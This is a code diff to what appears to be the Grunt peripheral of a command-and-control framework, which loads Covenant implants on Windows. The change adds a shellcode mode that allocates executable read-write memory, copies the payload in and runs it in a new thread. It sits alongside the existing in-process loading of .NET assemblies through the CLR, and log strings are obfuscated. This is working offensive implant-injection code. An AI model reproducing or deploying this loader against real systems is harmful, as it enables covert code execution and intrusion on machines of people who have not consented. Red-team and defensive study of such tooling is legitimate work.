@@ -96,7 +96,7 @@ static void RuntimeV4Host(PBYTE pbAssembly, SIZE_T assemblyLen)
 	pbDataIndex = (PBYTE)arr->pvData;
 
 	while (static_cast<SIZE_T>(pbAssemblyIndex - pbAssembly) < assemblyLen)
-		* (BYTE*)pbDataIndex++ = *(BYTE*)pbAssemblyIndex++;
+		*(BYTE*)pbDataIndex++ = *(BYTE*)pbAssemblyIndex++;
 
 	SafeArrayUnlock(arr);
 	hr = spDefaultAppDomain->Load_3(arr, &spAssembly);
@@ -170,9 +170,9 @@ Cleanup:
 FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 {
 
-	auto [manualExecution, pipeName, payload, connectAttempts] = arguments.Read<std::string, std::string, ByteVector, uint32_t>();
+	auto [manualExecution, gruntType, pipeName, payload, connectAttempts] = arguments.Read<std::string, std::string, std::string, ByteVector, uint32_t>();
 
-	BYTE *x = (BYTE *)payload.data();
+	BYTE* x = (BYTE*)payload.data();
 	SIZE_T len = payload.size();
 
 	//Setup the arguments to run the .NET assembly in a seperate thread.
@@ -184,11 +184,25 @@ FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 
 
 	// Inject the payload stage into the current process.
-	if (manualExecution != "true"){
-		Log({ OBF_SEC("Automatic grunt execution"), LogMessage::Severity::DebugInformation });
-		if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SEH::SehWrapperCov), &args, 0, nullptr))
-	 		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
-	} else {
+	if (manualExecution != "true") {
+		if (gruntType == "binary") {
+			Log({ OBF_SEC("Binary, Automatic grunt execution"), LogMessage::Severity::DebugInformation });
+			if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(SEH::SehWrapperCov), &args, 0, nullptr))
+				throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
+		}
+		else if (gruntType == "shellcode") {
+			Log({ OBF_SEC("Shellcode, Automatic grunt execution"), LogMessage::Severity::DebugInformation });
+			PVOID pa = VirtualAlloc(nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			if (nullptr == pa) {
+				throw std::runtime_error{ OBF("Couldn't allocate mem: ") + std::to_string(GetLastError()) + OBF(".") };
+			}
+			memcpy(pa, payload.data(), payload.size());
+			DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;
+			if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(sehWrapper), pa, 0, nullptr))
+				throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
+		}
+	}
+	else {
 		Log({ OBF_SEC("Manual grunt execution"), LogMessage::Severity::DebugInformation });
 	}
 
@@ -245,10 +259,22 @@ FSecure::ByteView FSecure::C3::Interfaces::Peripherals::Grunt::GetCapability()
 		"arguments":
 		[
 			{
-				"type": "string",
+				"type": "select",
 				"name": "Manual execution",
+				"selected": "true",
 				"defaultValue" : "true",
+				"options" : {"true": "true", "false": "false"},
+				"feedback" : "validated",
 				"description": "Execute grunt manually or automatically."
+			},
+			{
+				"type": "select",
+				"name": "Grunt Type",
+				"selected" : "shellcode",
+				"defaultValue" : "shellcode",
+				"options" : {"binary": "binary", "shellcode": "shellcode"},
+				"feedback" : "validated",
+				"description": "Covenant grunt template type. (shellcode/binary) "
 			},
 			{
 				"type": "string",
